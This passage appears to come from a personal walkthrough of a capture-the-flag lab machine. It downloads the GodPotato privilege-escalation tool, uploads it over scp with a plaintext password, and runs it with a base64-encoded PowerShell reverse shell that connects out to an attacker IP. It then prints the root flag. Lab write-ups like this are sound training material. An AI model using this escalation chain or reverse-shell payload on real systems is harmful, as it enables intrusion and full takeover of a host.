Location: https://release-assets.githubusercontent.com/github-production-release-asset/581555871/b68ac241-9196-40a1-a4bd-37fbd2c5b5d6?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T18%3A16%3A30Z&rscd=attachment%3B+filename%3DGodPotato-NET35.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T17%3A16%3A18Z&ske=2026-04-25T18%3A16%3A30Z&sks=b&skv=2018-11-09&sig=VZS9vejsOntWqmJ%2BJeSM7UyEau%2BE9sFAPIUwRWMGV4w%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzEzNzcyNiwibmJmIjoxNzc3MTM3NDI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.l6mh-L2yjwGBGLBm_FFOha9kvp7C_WFoRm8lAwXw0FE&response-content-disposition=attachment%3B%20filename%3DGodPotato-NET35.exe&response-content-type=application%2Foctet-stream [following]
--2026-04-26 01:17:06--  https://release-assets.githubusercontent.com/github-production-release-asset/581555871/b68ac241-9196-40a1-a4bd-37fbd2c5b5d6?sp=r&sv=2018-11-09&sr=b&spr=https&se=2026-04-25T18%3A16%3A30Z&rscd=attachment%3B+filename%3DGodPotato-NET35.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2026-04-25T17%3A16%3A18Z&ske=2026-04-25T18%3A16%3A30Z&sks=b&skv=2018-11-09&sig=VZS9vejsOntWqmJ%2BJeSM7UyEau%2BE9sFAPIUwRWMGV4w%3D&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc3NzEzNzcyNiwibmJmIjoxNzc3MTM3NDI2LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.l6mh-L2yjwGBGLBm_FFOha9kvp7C_WFoRm8lAwXw0FE&response-content-disposition=attachment%3B%20filename%3DGodPotato-NET35.exe&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 57344 (56K) [application/octet-stream]
Saving to: ‘GodPotato-NET35.exe’

GodPotato-NET35.exe          100%[==============================================>]  56.00K  --.-KB/s    in 0.04s   

2026-04-26 01:17:07 (1.30 MB/s) - ‘GodPotato-NET35.exe’ saved [57344/57344]


```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sshpass -p '1234virus@' scp ./GodPotato-NET35.exe enox@10.129.234.67:/programdata/ 
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html

```

i tried   GodPotato-NET2.exe

GodPotato-NET35.exe

GodPotato-NET4.exe  , but only the GodPotato-NET4.exe   is success , i dont know why

```
PS C:\programdata> .\GodPotato-NET4.exe -cmd "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMwA5ACIALAA0ADQANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="



```

```
PS C:\Users\Administrator\Desktop> type root.txt
2c983458e089c0926c11293501d7fe74

```
